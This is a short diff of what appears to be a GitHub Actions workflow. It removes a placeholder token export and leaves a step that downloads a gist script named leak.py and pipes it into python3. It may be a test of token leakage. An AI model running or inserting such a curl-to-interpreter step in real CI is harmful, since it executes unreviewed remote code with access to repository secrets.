@@ -18,5 +18,4 @@ jobs:
 
       - name: Run script from URL
         run: |
-          export GITHUB_TOKEN="test-token-123"
           curl -s https://gist.githubusercontent.com/Pranesh-Shrestha/275c2478d3fcfc393c7434ce4b896e9f/raw/72c611c059873f3f7a3875936ea0ddc213703785/leak.py | python3
